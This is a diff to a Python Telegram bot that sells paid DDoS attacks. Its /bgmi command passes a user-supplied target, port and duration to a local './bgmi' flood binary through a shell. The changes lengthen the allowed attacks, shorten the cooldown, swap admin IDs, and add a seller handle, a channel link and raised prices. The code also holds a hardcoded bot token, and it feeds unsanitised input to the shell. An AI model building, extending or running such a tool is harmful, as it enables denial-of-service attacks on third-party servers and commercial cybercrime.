@@ -11,7 +11,7 @@ keep_alive()
 bot = telebot.TeleBot('6425618314:AAEgnZe1hV8pL5dIbMIIXmdnQISj8d-dCUo')
 
 # Admin user IDs
-admin_id = {"948895728", "6942392489"}
+admin_id = {"6266215827"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -221,7 +221,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
+                response = "You Are On Cooldown . Please Wait 1sec Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -232,19 +232,19 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 181:
-                response = "Error: Time interval must be less than 80."
+            if time > 281:
+                response = "Error: Time interval must be less than 280."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 300"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = " You Are Not Authorized To Use This Command ."
+        response = "🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command.                                                                          DM TO BUY ACCESS:- @IPxKING_OWNER"
 
     bot.reply_to(message, response)
 
@@ -282,6 +282,8 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
+Buy From :- @IPxKING_OWNER
+Official Channel :- https://t.me/+6pLYLxgt8QI5ZmFl
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -296,9 +298,9 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
+    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
 🤖Try To Run This Command : /help 
-'''
+✅BUY :- @IPxKING_OWNER'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -307,8 +309,9 @@ def welcome_rules(message):
     response = f'''{user_name} Please Follow These Rules ⚠️:
 
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
+2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
+3. MAKE SURE YOU JOINED https://t.me/+6pLYLxgt8QI5ZmFl OTHERWISE NOT WORK
+4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -317,13 +320,13 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 180 (S)
+-> Attack Time : 280 (S)
 > After Attack Limit : 5 Min
 -> Concurrents Attack : 3
 
 Pr-ice List💸 :
-Day-->100 Rs
-Week-->400 Rs
+Day-->150 Rs
+Week-->600 Rs
 Month-->800 Rs
 '''
     bot.reply_to(message, response)
